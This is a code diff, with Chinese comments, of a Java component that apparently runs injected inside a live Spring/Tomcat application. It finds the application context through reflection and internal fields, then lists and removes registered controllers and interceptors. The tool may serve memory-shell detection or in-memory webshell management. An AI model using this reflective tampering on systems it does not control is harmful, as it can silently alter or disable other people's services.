@@ -4,7 +4,6 @@ import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.*;
-import java.util.concurrent.ConcurrentHashMap;
 
 public class SpringFrameworkManageComponent implements Runnable {
 
@@ -12,9 +11,6 @@ public class SpringFrameworkManageComponent implements Runnable {
     private HashMap results;
     // 注意：曾经这里有 `private static Object context` 缓存，第一次 idle 拿不到就永远空。
     // 现在每次 invoke 都重新解析。
-    private static Map interceptorMap = new ConcurrentHashMap();
-
-
     public void run() {
         java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
         try {
@@ -52,19 +48,34 @@ public class SpringFrameworkManageComponent implements Runnable {
         context = getContext();
         if ("getFrameworkInfo".equals(methodName)) {
             results.put("frameworkInfo",getFrameworkInfo());
+            results.put("code", Integer.valueOf(200));
+            return;
         } else if ("unLoadController".equals(methodName)) {
             String mappingInfo= (String) params.get("mappingInfo");
-            unLoadController(mappingInfo);
+            putOperationResult(unLoadController(mappingInfo));
         } else if ("unLoadInterceptor".equals(methodName)) {
             String interceptorId= (String) params.get("interceptorId");
-            unLoadInterceptor(interceptorId);
+            putOperationResult(unLoadInterceptor(interceptorId));
         }
-        results.put("code", 200);
+    }
+
+    private void putOperationResult(Boolean changed) {
+        boolean removed = Boolean.TRUE.equals(changed);
+        results.put("removed", Boolean.valueOf(removed));
+        results.put("verified", Boolean.TRUE);
+        results.put("status", removed ? "CHANGED" : "NOT_FOUND");
+        results.put("code", Integer.valueOf(removed ? 200 : 404));
     }
 
 
     private HashMap getFrameworkInfo() throws Exception {
         HashMap frameworkInfo=new HashMap();
+        frameworkInfo.put("allController", new ArrayList());
+        frameworkInfo.put("allMappedInterceptor", new ArrayList());
+        frameworkInfo.put("contextAvailable", Boolean.valueOf(context != null));
+        if (context != null) {
+            frameworkInfo.put("contextClassName", context.getClass().getName());
+        }
         try {frameworkInfo.put("allController",getAllController());}catch (Exception ignored){}
         try {frameworkInfo.put("allMappedInterceptor",getAllMappedInterceptor());}catch (Exception ignored){}
         return frameworkInfo;
@@ -97,19 +108,28 @@ public class SpringFrameworkManageComponent implements Runnable {
     }
 
 
-    public void unLoadController(String mappingInfo) throws Exception {
+    public Boolean unLoadController(String mappingInfo) throws Exception {
+        if (context == null) return Boolean.FALSE;
         Object abstractHandlerMapping = invokeMethod(context, "getBean", new Class[]{String.class}, new Object[]{"requestMappingHandlerMapping"});
 
         Object mappingRegistry = getMappingRegistry(abstractHandlerMapping);
         Map registry = getRegistrations(mappingRegistry);
         Iterator it = new ArrayList(registry.keySet()).iterator();
+        boolean removed = false;
 
         while (it.hasNext()) {
             Object key = it.next();
             if (key.toString().equals(mappingInfo)) {
                 invokeMethod(mappingRegistry, "unregister", new Class[]{key.getClass()}, new Object[]{key});
+                removed = true;
             }
         }
+        if (!removed) return Boolean.FALSE;
+        Iterator verify = getRegistrations(mappingRegistry).keySet().iterator();
+        while (verify.hasNext()) {
+            if (String.valueOf(verify.next()).equals(mappingInfo)) return Boolean.FALSE;
+        }
+        return Boolean.TRUE;
     }
 
     private Object getMappingRegistry(Object handlerMapping) throws Exception {
@@ -131,7 +151,6 @@ public class SpringFrameworkManageComponent implements Runnable {
 
 
     public ArrayList getAllMappedInterceptor() throws Exception {
-        interceptorMap.clear();
         Object abstractHandlerMapping = invokeMethod(context, "getBean", new Class[]{String.class}, new Object[]{"requestMappingHandlerMapping"});
         Object[] adaptedInterceptors= (Object[]) invokeMethod(abstractHandlerMapping,"getAdaptedInterceptors");
         ArrayList AllMappedInterceptor=new ArrayList();
@@ -140,8 +159,7 @@ public class SpringFrameworkManageComponent implements Runnable {
             if (adaptedInterceptor.getClass().getName().equals("org.springframework.web.servlet.handler.MappedInterceptor")){
                 Object pathPatterns=invokeMethod(adaptedInterceptor,"getPathPatterns");
                 Object interceptor=invokeMethod(adaptedInterceptor,"getInterceptor");
-                String interceptorId= String.valueOf(UUID.randomUUID());
-                interceptorMap.put(interceptorId,adaptedInterceptor);
+                String interceptorId= Integer.toHexString(System.identityHashCode(adaptedInterceptor));
                 Object[] excludePatterns= (Object[]) getFV(adaptedInterceptor,"excludePatterns");
                 ArrayList excludePatternList=new ArrayList();
                 if (excludePatterns!=null){
@@ -155,8 +173,7 @@ public class SpringFrameworkManageComponent implements Runnable {
                 interceptorInfo.put("interceptorId",interceptorId);
                 AllMappedInterceptor.add(interceptorInfo);
             }else {
-                String interceptorId= String.valueOf(UUID.randomUUID());
-                interceptorMap.put(interceptorId,adaptedInterceptor);
+                String interceptorId= Integer.toHexString(System.identityHashCode(adaptedInterceptor));
                 interceptorInfo.put("pathPatterns",new String[]{"/*"});
                 interceptorInfo.put("interceptorName",adaptedInterceptor.getClass().getName());
                 interceptorInfo.put("excludePatterns",null);
@@ -166,30 +183,53 @@ public class SpringFrameworkManageComponent implements Runnable {
         }
         return AllMappedInterceptor;
     }
-    public void unLoadInterceptor(String interceptorId) throws Exception {
+    public Boolean unLoadInterceptor(String interceptorId) throws Exception {
+        if (context == null) return Boolean.FALSE;
+        boolean removed = false;
         Map handlerMappings= (Map) invokeMethod(context, "getBeansOfType", new Class[]{Class.class}, new Object[]{Class.forName("org.springframework.web.servlet.HandlerMapping",false,Thread.currentThread().getContextClassLoader())});
         Set keys=handlerMappings.keySet();
         for (Object key: keys) {
             Object handler=handlerMappings.get(key);
             ArrayList<Object> adaptedInterceptors = (ArrayList<Object>) getFV(handler, "adaptedInterceptors");
             if (adaptedInterceptors!=null){
-                adaptedInterceptors.remove(interceptorMap.get(interceptorId));
+                removed = removeInterceptorById(adaptedInterceptors, interceptorId) || removed;
             }
             ArrayList<Object> interceptors = (ArrayList<Object>) getFV(handler, "interceptors");
             if (interceptors!=null){
-                interceptors.remove(interceptorMap.get(interceptorId));
+                removed = removeInterceptorById(interceptors, interceptorId) || removed;
             }
         }
-        interceptorMap.remove(interceptorId);
+        return Boolean.valueOf(removed);
+    }
+
+    private boolean removeInterceptorById(ArrayList interceptors, String interceptorId) {
+        Iterator iterator = interceptors.iterator();
+        while (iterator.hasNext()) {
+            Object value = iterator.next();
+            if (value != null && interceptorId.equals(
+                    Integer.toHexString(System.identityHashCode(value)))) {
+                iterator.remove();
+                return true;
+            }
+        }
+        return false;
     }
 
     public static Object getContext() {
         ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
         Object context = null;
 
+        // 路径 0：标准 ContextLoader 静态入口，覆盖大多数独立 Servlet 容器。
+        try {
+            context = invokeMethod(classLoader.loadClass(
+                    "org.springframework.web.context.ContextLoader"),
+                    "getCurrentWebApplicationContext");
+        } catch (Exception ignored) {
+        }
+
         // 路径 1：从当前请求线程绑定的 RequestAttributes 直接拿 ServletContext
         // 只在请求线程里有效（puppet 在请求线程上执行时才走得通），idle 时返回 null
-        try {
+        if (context == null) try {
             Object requestAttributes = invokeMethod(classLoader.loadClass("org.springframework.web.context.request.RequestContextHolder"), "getRequestAttributes");
             Object httprequest = invokeMethod(requestAttributes, "getRequest");
             Object session = invokeMethod(httprequest, "getSession");
@@ -212,7 +252,23 @@ public class SpringFrameworkManageComponent implements Runnable {
             }
         }
 
-        // 路径 3：从 Tomcat StandardContext 反推 ServletContext → WebApplicationContext
+        // 路径 3：Spring Boot 2.3+ 的 shutdown hook 持有仍存活的应用上下文；
+        // 对 WebFlux（没有 ServletContext）尤其重要。
+        if (context == null) {
+            try {
+                Class hookClass = classLoader.loadClass("org.springframework.boot.SpringApplicationShutdownHook");
+                Field instanceField = hookClass.getDeclaredField("INSTANCE");
+                instanceField.setAccessible(true);
+                Object hook = instanceField.get(null);
+                Object contexts = getFV(hook, "contexts");
+                if (contexts instanceof Collection && !((Collection) contexts).isEmpty()) {
+                    context = ((Collection) contexts).iterator().next();
+                }
+            } catch (Exception ignored) {
+            }
+        }
+
+        // 路径 4：从 Tomcat StandardContext 反推 ServletContext → WebApplicationContext
         // 解决 idle Tomcat + 全局 CL 注入场景（路径 1/2 都失效时的最终兜底）
         if (context == null) {
             try {
@@ -225,17 +281,17 @@ public class SpringFrameworkManageComponent implements Runnable {
     }
 
     /**
-     * 复用 TomcatCatalinaManageComponent 的扫描逻辑拿到所有 StandardContext，
+     * 复用 TomcatContainerManageComponent 的扫描逻辑拿到所有 StandardContext，
      * 再从每个 context 的 servletContext 走 WebApplicationContextUtils.getWebApplicationContext()。
      *
-     * 故意走反射而不是直接 import，避免 puppet 端没有 TomcatCatalinaManageComponent 时编译失败。
+     * 故意走反射而不是直接 import，避免 puppet 端没有 TomcatContainerManageComponent 时编译失败。
      */
     private static Object getContextFromTomcat(ClassLoader cl) throws Throwable {
         Class tomcatComp;
         try {
-            tomcatComp = cl.loadClass("org.leo.core.component.TomcatCatalinaManageComponent");
+            tomcatComp = cl.loadClass("org.leo.core.component.TomcatContainerManageComponent");
         } catch (Throwable t) {
-            // TomcatCatalinaManageComponent 还没被 puppet 端加载，自己扫一遍 MBean
+            // TomcatContainerManageComponent 还没被 puppet 端加载，自己扫一遍 MBean
             return getContextFromTomcatMbean(cl);
         }
         Method getCtx = tomcatComp.getDeclaredMethod("getContext");
@@ -244,7 +300,7 @@ public class SpringFrameworkManageComponent implements Runnable {
         return resolveWebAppContext(standardContexts, cl);
     }
 
-    /** TomcatCatalinaManageComponent 没加载时，自己走 PlatformMBeanServer 查 WebModule。 */
+    /** TomcatContainerManageComponent 没加载时，自己走 PlatformMBeanServer 查 WebModule。 */
     private static Object getContextFromTomcatMbean(ClassLoader cl) throws Throwable {
         Class mfClass = Class.forName("java.lang.management.ManagementFactory");
         Object mbs = mfClass.getMethod("getPlatformMBeanServer").invoke(null);
